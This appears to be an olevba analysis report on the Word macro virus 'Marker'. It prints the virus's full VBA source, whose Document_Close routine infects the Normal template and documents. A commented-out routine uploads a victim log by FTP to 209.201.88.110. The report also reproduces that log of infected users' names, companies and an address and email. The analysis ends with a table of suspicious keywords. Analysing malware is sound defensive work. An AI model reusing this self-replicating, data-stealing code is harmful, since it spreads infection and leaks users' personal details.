olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-6f338eebf33497a081dd5f27054665cade245d31
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-6f338eebf33497a081dd5f27054665cade245d31 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 1, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 10000, 10000)


' Switch the VirusProtection OFF
' Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
'    For i = 1 To 4
'      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
'    Next i
'    LogFile = "C:\hsf" & LogFile & ".sys"
    
'    Open LogFile For Output As #1
'    Print #1, LogData
'    Close #1
    
'    Open "c:\netldx.vxd" For Output As #1
'    Print #1, "o 209.201.88.110"
'    Print #1, "user anonymous"
'    Print #1, "pass itsme@"
'    Print #1, "cd incoming"
'    Print #1, "ascii"
'    Print #1, "put " & LogFile
'    Print #1, "quit"
'    Close #1
    
'    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
'    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 11:37:56 AM - Tuesday, 29 Dec 1998
' Dan Ross
'



' 09:50:06 AM - Monday, 11 Jan 1999
' Karen M. Pinks
'



' 04:41:03 PM - Thursday, 21 Jan 1999
' george w. connelly
'



' 02:47:55 PM - Friday, 22 Jan 1999
' Michael L. Pusey
'



' 08:24:22 AM - Sunday, 24 Jan 1999
' Andrea F. Walker
'



' 08:21:33 PM - Sunday, 24 Jan 1999
' Brian Turner
'



' 01:46:46 PM - Tuesday, 26 Jan 1999
' Brad Englert
' Andersen Consulting LLP
' 701 Brazos, Suite 1000
' Austin, TX  78701



' 05:32:45 PM - Tuesday, 26 Jan 1999
' Marcia Lemmons
'



' 10:42:32  - Wednesday, 3 Feb 1999
' Lisa Ann La Plant
'



' 01:37:32  - Thursday, 4 Feb 1999
' Harvard Publication Relations
'



' 02:04:29 PM - Monday, 15 Feb 1999
' annie
'



' 10:19:22  - Montag, 22 Feb 1999
' karin schmid
'



' 08:34:26  - Montag, 1 Mrz 1999
' margit
'



' 10:38:06  - mandag, 8 mar 1999
' Birthe Christensen
'



' 08:07:08  - tirsdag, 9 mar 1999
' Danisco A/S
'



' 08:27:18  - mandag, 15 mar 1999
' DD-S, JRH
'



' 09:43:22  - fredag, 19 mar 1999
' Birthe Christensen
'



' 01:38:29  - tirsdag, 23 mar 1999
' Susanne L. Sørensen
' SFSLS@DANISCO.COM



' 02:08:34  - tirsdag, 6 apr 1999
' Fddd2
'



' 01:07:09  - fredag, 9 apr 1999
' Fddd2
'



' 01:49:27 PM - Tuesday, 13 Apr 1999
' Avert
'



' 12:20:48  - âòîðíèê, 4 ìàé 1999
' Mike Pavluschick
'



' 03:06:13 PM - Tuesday, 27 Feb 2001
' Tester
'


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

